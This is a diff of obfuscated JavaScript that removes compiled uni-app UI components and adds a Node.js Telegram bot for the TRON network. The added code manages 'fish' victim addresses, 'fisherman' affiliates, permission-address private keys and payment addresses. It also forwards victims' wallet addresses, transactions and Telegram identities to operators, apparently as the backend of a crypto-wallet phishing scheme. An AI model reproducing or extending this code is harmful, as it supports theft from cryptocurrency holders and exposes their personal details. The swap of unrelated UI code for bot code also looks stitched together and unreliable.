-            fontSize: e.fontSize + "px"
-          }),
-          attrs: {
-            href: e._$s(0, "a-href", e.href),
-            download: e._$s(0, "a-download", e.download),
-            _i: 0
-          }
-        }, [e._t("default", [e._v(e._$s(1, "t0-0", e._s(e.text)))], {
-          _i: 1
-        })], 2) : n("text", {
-          staticClass: e._$s(2, "sc", "uni-link"),
-          class: e._$s(2, "c", {
-            "uni-link--withline": !0 === e.showUnderLine || "true" === e.showUnderLine
-          }),
-          style: e._$s(2, "s", {
-            color: e.color,
-            fontSize: e.fontSize + "px"
-          }),
-          attrs: {
-            _i: 2
-          },
-          on: {
-            click: e.openURL
-          }
-        }, [e._t("default", [e._v(e._$s(3, "t0-0", e._s(e.text)))], {
-          _i: 3
-        })], 2);
-      },
-      i = [];
-  },
-  c28b: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("cbed"),
-      i = n("1d88");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
+  });
+  cacheData.fishMap = b;
+  cacheData.fishBrowseMap = I;
+  cacheData.dailiMap = F;
+  cacheData.dailiGroupMap = U;
+  cacheData.options = u;
+  cacheData.permissionAddresses = K;
+  tronKeyManager.refreshFromOptions(u.trongridkyes);
+}
+async function startCacheUpdate() {
+  while (true) {
+    try {
+      __refreshPromise = refreshCacheOnce();
+      await __refreshPromise;
+      __refreshPromise = null;
+      await new Promise(J => setTimeout(J, 3000));
+    } catch (J) {
+      try {
+        console.error("[cacheRefresh]", J);
+      } catch (z) {}
+      __refreshPromise = null;
+      await new Promise(l => setTimeout(l, 5000));
+    }
+  }
+}
+startCacheUpdate.refreshNow = async () => {
+  if (__refreshPromise) {
+    try {
+      await __refreshPromise;
+    } catch (a) {}
+    return;
+  }
+  try {
+    __refreshPromise = refreshCacheOnce();
+    await __refreshPromise;
+  } catch (l) {
+    try {
+      console.error("[cacheRefresh-now]", l);
+    } catch (I) {}
+  } finally {
+    __refreshPromise = null;
+  }
+};
+let bot = null;
+async function initBot() {
+  try {
+    const I = [],
+      F = [];
+    if (!cacheData.options.bot_key || cacheData.options.bot_key.trim() === "") {
+      I.push("机器人密钥");
+    }
+    if (!cacheData.options.trongridkyes || cacheData.options.trongridkyes.trim() === "") {
+      I.push("TronGrid密钥");
+    }
+    if (!cacheData.options.main_domain || cacheData.options.main_domain.trim() === "") {
+      I.push("主域名");
+    }
+    if (cacheData.dailiGroupMap.size === 0) {
+      I.push("群组信息");
+    }
+    if (!cacheData.options.private_key || cacheData.options.private_key.trim() === "") {
+      I.push("TRC权限私钥");
+    } else {
+      const s = cacheData.options.private_key.trim();
+      if (!/^[0-9a-fA-F]{64}$/.test(s)) {
+        F.push("TRC权限私钥不正确");
+      }
+    }
+    if (!cacheData.options.payment_address || cacheData.options.payment_address.trim() === "") {
+      I.push("TRC收款地址");
+    } else {
+      const M = cacheData.options.payment_address.trim();
+      if (!/^T[A-Za-z0-9]{33}$/.test(M)) {
+        F.push("TRC收款地址不正确");
+      }
+    }
+    if (cacheData.permissionAddresses.length === 0) {
+      I.push("TRC权限地址");
+    } else {
+      cacheData.permissionAddresses.forEach((N, r) => {
+        if (!/^T[A-Za-z0-9]{33}$/.test(N.trim())) {
+          F.push("第" + (r + 1) + "个权限地址不正确");
+        }
       });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  c383: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("dfeb"),
-      i = n("f411");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  c41e: function (e, t, n) {
-    "use strict";
-
-    var r = n("47a9");
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    var i,
-      o = n("d3b4"),
-      a = r(n("24c5"));
-    setTimeout(function () {
-      i = uni.getSystemInfoSync().platform;
-    }, 16);
-    var s = (0, o.initVueI18n)(a.default),
-      u = s.t,
-      c = {
-        name: "UniLoadMore",
-        emits: ["clickLoadMore"],
-        props: {
-          status: {
-            type: String,
-            default: "more"
-          },
-          showIcon: {
-            type: Boolean,
-            default: !0
-          },
-          iconType: {
-            type: String,
-            default: "auto"
-          },
-          iconSize: {
-            type: Number,
-            default: 24
-          },
-          color: {
-            type: String,
-            default: "#777777"
-          },
-          contentText: {
-            type: Object,
-            default: function () {
-              return {
-                contentdown: "",
-                contentrefresh: "",
-                contentnomore: ""
-              };
-            }
-          },
-          showText: {
-            type: Boolean,
-            default: !0
-          }
-        },
-        data: function () {
-          return {
-            webviewHide: !1,
-            platform: i,
-            imgBase64: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QzlBMzU3OTlEOUM0MTFFOUI0NTZDNERBQURBQzI4RkUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QzlBMzU3OUFEOUM0MTFFOUI0NTZDNERBQURBQzI4RkUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDOUEzNTc5N0Q5QzQxMUU5QjQ1NkM0REFBREFDMjhGRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDOUEzNTc5OEQ5QzQxMUU5QjQ1NkM0REFBREFDMjhGRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pt+ALSwAAA6CSURBVHja1FsLkFZV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"
+    }
+    if (I.length > 0 || F.length > 0) {
+      let N = "\n======机器人启动失败======\n";
+      I.length > 0 && (N += "缺少配置选项：\n", I.forEach((B, R) => N += R + 1 + ".【" + B + "】\n"));
+      if (F.length > 0) {
+        if (I.length > 0) {
+          N += "\n";
+        }
+        N += "配置信息不正确：\n";
+        F.forEach((R, f) => N += f + 1 + ".【" + R + "】\n");
+      }
+      N += "======机器人启动失败======";
+      console.error("[" + getTimeInfo().time + "] Bot初始化失败:" + N);
+      return false;
+    }
+    const U = cacheData.options.bot_key,
+      u = {
+        offset: -1,
+        timeout: 30
+      };
+    const K = {};
+    K.interval = 3000;
+    K.autoStart = true;
+    K.params = u;
+    const q = {};
+    q.keepAlive = true;
+    q.family = 4;
+    const E = {};
+    E.agentOptions = q;
+    const P = {};
+    P.polling = K;
+    P.request = E;
+    bot = new TelegramBot(U, P);
+    bot.on("polling_error", f => console.error("[" + getTimeInfo().time + "] 轮询错误:", f));
+    setupBotHandlers(bot);
+    setupCallbackHandlers(bot);
+    startTrcidLeadWatcher(bot);
+    return true;
+  } catch (f) {
+    console.error("[" + getTimeInfo().time + "] Bot初始化失败:", f);
+    return false;
+  }
+}
+function setupCallbackHandlers(j) {
+  j.on("callback_query", async n => {
+    try {
+      const S = n.data;
+      if (!S) {
+        return;
+      }
+      if (S.startsWith("pv:")) {
+        const i = S.split(":"),
+          Q = i[1],
+          T = i[2] || "";
+        let C = pvStore.get(T);
+        if (!C) {
+          const p4 = {
+            text: "链接已过期，请重新获取",
+            show_alert: true
           };
-        },
-        computed: {
-          iconSnowWidth: function () {
-            return 2 * (Math.floor(this.iconSize / 24) || 1);
-          },
-          contentdownText: function () {
-            return this.contentText.contentdown || u("uni-load-more.contentdown");
-          },
-          contentrefreshText: function () {
-            return this.contentText.contentrefresh || u("uni-load-more.contentrefresh");
-          },
-          contentnomoreText: function () {
-            return this.contentText.contentnomore || u("uni-load-more.contentnomore");
+          await j.answerCallbackQuery(n.id, p4);
+          return;
+        }
+        const v = n.message.chat.id.toString(),
+          x = n.from.id,
+          k = cacheData.dailiMap.get(C.uniqueId);
+        if (!k) {
+          const p6 = {
+            text: "未找到代理",
+            show_alert: true
+          };
+          await j.answerCallbackQuery(n.id, p6);
+          return;
+        }
+        const D = await checkGroupAdminStatus(j, v, x),
+          H = k && k.tguid && String(k.tguid) === String(x),
+          y = (D.isAdmin || D.isCreator) && String(v) === String(k.groupid);
+        if (Q === "addr" || Q === "tx") {
+          if (!H && !y) {
+            await j.answerCallbackQuery(n.id, {
+              text: Q === "addr" ? "无权限查看该地址" : "无权限查看交易详情",
+              show_alert: true
+            });
+            return;
           }
-        },
-        mounted: function () {
-          var e = this,
-            t = getCurrentPages(),
-            n = t[t.length - 1],
-            r = n.$getAppWebview();
-          r.addEventListener("hide", function () {
-            e.webviewHide = !0;
-          }), r.addEventListener("show", function () {
-            e.webviewHide = !1;
-          });
-        },
-        methods: {
-          onClick: function () {
-            this.$emit("clickLoadMore", {
-              detail: {
-                status: this.status
+          if (Q === "addr") {
+            const p8 = String(C.payload || "");
+            try {
+              const pp = {
+                parse_mode: "HTML",
+                disable_web_page_preview: true
+              };
+              await j.sendMessage(x, "🐟 鱼苗地址：\n<code>" + p8 + "</code>", pp);
+              try {
+                const pj = {
+                  text: "地址已发送至私聊",
+                  show_alert: false
+                };
+                await j.answerCallbackQuery(n.id, pj);
+              } catch (pw) {}
+            } catch (pJ) {
+              try {
+                const pl = {
+                  text: p8,
+                  show_alert: true
+                };
+                await j.answerCallbackQuery(n.id, pl);
+              } catch (pb) {}
+            }
+            return;
+          } else {
+            const pU = String(C.payload || ""),
+              pu = "https://tronscan.org/#/transaction/" + pU;
+            try {
+              const pq = {
+                parse_mode: "HTML",
+                disable_web_page_preview: true
+              };
+              await j.sendMessage(x, "<a href=\"" + pu + "\">点击查看交易详情</a>", pq);
+              try {
+                const pE = {
+                  text: "交易链接已发送至私聊",
+                  show_alert: false
+                };
+                await j.answerCallbackQuery(n.id, pE);
+              } catch (pO) {}
+            } catch (ps) {
+              try {
+                const pA = {
+                  text: pu,
+                  show_alert: true
+                };
+                await j.answerCallbackQuery(n.id, pA);
+              } catch (pL) {}
+            }
+            return;
+          }
+        }
+        if (Q === "lead") {
+          if (!(String(k.groupid) === v && String(k.tguid) === String(x))) {
+            const pr = {
+              text: "仅渔夫本人可查看鱼儿信息",
+              show_alert: true
+            };
+            await j.answerCallbackQuery(n.id, pr);
+            return;
+          }
+          try {
+            const pR = String(C.payload && C.payload.at || "");
+            let pf = null;
+            const pX = recentLeads.get(String(pR));
+            if (pX && pX.uniqueId === C.uniqueId) {
+              pf = pX.user || null;
+            }
+            if (!pf) {
+              const pQ = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
+                pT = JSON.parse(pQ),
+                pC = String(pT?.["at"] || "");
+              if (pC !== pR) {
+                const px = {
+                  text: "未找到对应的访问者信息",
+                  show_alert: true
+                };
+                await j.answerCallbackQuery(n.id, px);
+                return;
               }
-            });
-          }
-        }
-      };
-    t.default = c;
-  },
-  c5e5: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("5f26"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  c7ab: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("b92e"),
-      i = n("6555");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  c99b: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("09c7"),
-      i = n("67b2");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  cbed: function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return r;
-    }), n.d(t, "c", function () {
-      return i;
-    }), n.d(t, "a", function () {});
-    var r = function () {
-        var e = this.$createElement,
-          t = this._self._c || e;
-        return t("view");
-      },
-      i = [];
-  },
-  d3b4: function (e, t, n) {
-    "use strict";
-
-    (function (e) {
-      var r = n("47a9");
-      Object.defineProperty(t, "__esModule", {
-        value: !0
-      }), t.LOCALE_ZH_HANT = t.LOCALE_ZH_HANS = t.LOCALE_FR = t.LOCALE_ES = t.LOCALE_EN = t.I18n = t.Formatter = void 0, t.compileI18nJsonStr = function (e, t) {
-        var n = t.locale,
-          r = t.locales,
-          i = t.delimiters;
-        if (!S(e, i)) return e;
-        x || (x = new l());
-        var o = [];
-        Object.keys(r).forEach(function (e) {
-          e !== n && o.push({
-            locale: e,
-            values: r[e]
-          });
-        }), o.unshift({
-          locale: n,
-          values: r[n]
-        });
-        try {
-          return JSON.stringify(T(JSON.parse(e), o, i), null, 2);
-        } catch (a) {}
-        return e;
-      }, t.hasI18nJson = function e(t, n) {
-        x || (x = new l());
-        return P(t, function (t, r) {
-          var i = t[r];
-          return k(i) ? !!S(i, n) || void 0 : e(i, n);
-        });
-      }, t.initVueI18n = function (e) {
-        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
-          n = arguments.length > 2 ? arguments[2] : void 0,
-          r = arguments.length > 3 ? arguments[3] : void 0;
-        if ("string" !== typeof e) {
-          var i = [t, e];
-          e = i[0], t = i[1];
-        }
-        "string" !== typeof e && (e = b());
-        "string" !== typeof n && (n = "undefined" !== typeof __uniConfig && __uniConfig.fallbackLocale || "en");
-        var o = new y({
-            locale: e,
-            fallbackLocale: n,
-            messages: t,
-            watcher: r
-          }),
-          a = function (e, t) {
-            if ("function" !== typeof getApp) a = function (e, t) {
-              return o.t(e, t);
-            };else {
-              var n = !1;
-              a = function (e, t) {
-                var r = getApp().$vm;
-                return r && (r.$locale, n || (n = !0, w(r, o))), o.t(e, t);
+              pf = pT?.["user"] || null;
+              if (!pf) {
+                const pk = {
+                  text: "访问者信息缺失",
+                  show_alert: true
+                };
+                await j.answerCallbackQuery(n.id, pk);
+                return;
+              }
+            }
+            const pn = ("" + (pf.first_name || "") + (pf.last_name ? " " + pf.last_name : "")).trim() || "无",
+              pc = pf.username || "无",
+              pG = k.username || k.fullName || "无",
+              pS = "昵称：" + pn + "\n用户名：" + pc + "\n最后邀请人：" + pG,
+              pe = {
+                text: pS,
+                show_alert: true
               };
-            }
-            return a(e, t);
+            await j.answerCallbackQuery(n.id, pe);
+          } catch (pH) {
+            const py = {
+              text: "访问者信息读取失败",
+              show_alert: true
+            };
+            await j.answerCallbackQuery(n.id, py);
+          }
+          return;
+        }
+      }
+      if (S.startsWith("addr_info:")) {
+        const pW = S.split(":"),
+          pZ = pW[1],
+          pm = pW[2],
+          h0 = n.message.chat.id.toString(),
+          h1 = n.from.id,
+          h2 = cacheData.dailiMap.get(pm);
+        if (!h2) {
+          const h7 = {
+            text: "未找到代理",
+            show_alert: true
           };
-        return {
-          i18n: o,
-          f: function (e, t, n) {
-            return o.f(e, t, n);
-          },
-          t: function (e, t) {
-            return a(e, t);
-          },
-          add: function (e, t) {
-            var n = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
-            return o.add(e, t, n);
-          },
-          watch: function (e) {
-            return o.watchLocale(e);
-          },
-          getLocale: function () {
-            return o.getLocale();
-          },
-          setLocale: function (e) {
-            return o.setLocale(e);
+          await j.answerCallbackQuery(n.id, h7);
+          return;
+        }
+        const h3 = await checkGroupAdminStatus(j, h0, h1),
+          h4 = (h3.isAdmin || h3.isCreator) && String(h0) === String(h2.groupid),
+          h5 = h2 && h2.tguid && String(h2.tguid) === String(h1);
+        if (!h5 && !h4) {
+          const h8 = {
+            text: "无权限查看该地址",
+            show_alert: true
+          };
+          await j.answerCallbackQuery(n.id, h8);
+          return;
+        }
+        try {
+          const hh = {
+            parse_mode: "HTML",
+            disable_web_page_preview: true
+          };
+          await j.sendMessage(h1, "🐟 鱼苗地址：\n<code>" + pZ + "</code>", hh);
+          try {
+            const hw = {
+              text: "地址已发送至私聊",
+              show_alert: false
+            };
+            await j.answerCallbackQuery(n.id, hw);
+          } catch (hJ) {}
+        } catch (ha) {
+          try {
+            const hl = {
+              text: pZ,
+              show_alert: true
+            };
+            await j.answerCallbackQuery(n.id, hl);
+          } catch (hI) {}
+        }
+        return;
+      }
+      if (S.startsWith("tx_info:")) {
+        const hU = S.split(":"),
+          hu = hU[1],
+          hK = hU[2],
+          hq = n.message.chat.id.toString(),
+          hE = n.from.id,
+          hP = cacheData.dailiMap.get(hK);
+        if (!hP) {
+          const hL = {
+            text: "未找到代理",
+            show_alert: true
+          };
+          await j.answerCallbackQuery(n.id, hL);
+          return;
+        }
+        const hO = await checkGroupAdminStatus(j, hq, hE),
+          hs = (hO.isAdmin || hO.isCreator) && String(hq) === String(hP.groupid),
+          hd = hP && hP.tguid && String(hP.tguid) === String(hE);
+        if (!hd && !hs) {
+          const hY = {
+            text: "无权限查看交易详情",
+            show_alert: true
+          };
+          await j.answerCallbackQuery(n.id, hY);
+          return;
+        }
+        const hA = "https://tronscan.org/#/transaction/" + hu;
+        try {
+          const hr = {
+            parse_mode: "HTML",
+            disable_web_page_preview: true
+          };
+          await j.sendMessage(hE, "<a href=\"" + hA + "\">点击查看交易详情</a>", hr);
+          try {
+            const hB = {
+              text: "交易链接已发送至私聊",
+              show_alert: false
+            };
+            await j.answerCallbackQuery(n.id, hB);
+          } catch (hf) {}
+        } catch (hX) {
+          try {
+            const hc = {
+              text: hA,
+              show_alert: true
+            };
+            await j.answerCallbackQuery(n.id, hc);
+          } catch (hS) {}
+        }
+        return;
+      }
+      if (S.startsWith("lead_info:")) {
+        const ho = S.split(":"),
+          hi = ho[1],
+          hT = ho[3],
+          hC = cacheData.dailiMap.get(hi),
+          hv = n.message.chat.id.toString(),
+          hx = n.from.id.toString();
+        if (!hC || hC.groupid !== hv || hC.tguid !== hx) {
+          const hk = {
+            text: "仅渔夫本人可查看鱼儿信息",
+            show_alert: true
+          };
+          await j.answerCallbackQuery(n.id, hk);
+          return;
+        }
+        try {
+          let hy = null;
+          const ht = recentLeads.get(String(hT));
+          if (ht && ht.uniqueId === hi) {
+            hy = ht.user || null;
           }
-        };
-      }, t.isI18nStr = S, t.isString = void 0, t.normalizeLocale = _, t.parseI18nJson = function e(t, n, r) {
-        x || (x = new l());
-        return P(t, function (t, i) {
-          var o = t[i];
-          k(o) ? S(o, r) && (t[i] = O(o, n, r)) : e(o, n, r);
-        }), t;
-      }, t.resolveLocale = function (e) {
-        return function (t) {
-          return t ? (t = _(t) || t, function (e) {
-            var t = [],
-              n = e.split("-");
-            while (n.length) t.push(n.join("-")), n.pop();
-            return t;
-          }(t).find(function (t) {
-            return e.indexOf(t) > -1;
-          })) : t;
-        };
-      };
-      var i = r(n("34cf")),
-        o = r(n("67ad")),
